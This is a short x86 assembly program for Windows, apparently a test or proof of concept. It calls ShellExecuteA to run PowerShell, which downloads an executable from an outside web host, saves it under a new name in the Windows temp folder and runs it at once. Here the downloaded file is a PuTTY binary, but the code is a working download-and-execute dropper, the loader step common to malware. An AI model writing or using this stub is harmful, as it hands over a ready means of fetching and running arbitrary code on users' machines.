extern _ShellExecuteA
global _main


section .data 
    tipo db "open",0
    comando db "cmd",0
    par db "/c powershell -Command wget https://the.earth.li/~sgtatham/putty/0.63/x86/putty.exe -OutFile c:\windows\temp\teste.exe ; c:\windows\temp\teste.exe"
section .text
_main:
    push 0 
    push 0
    push par
    push comando
    push tipo
    push 0
    call _ShellExecuteA
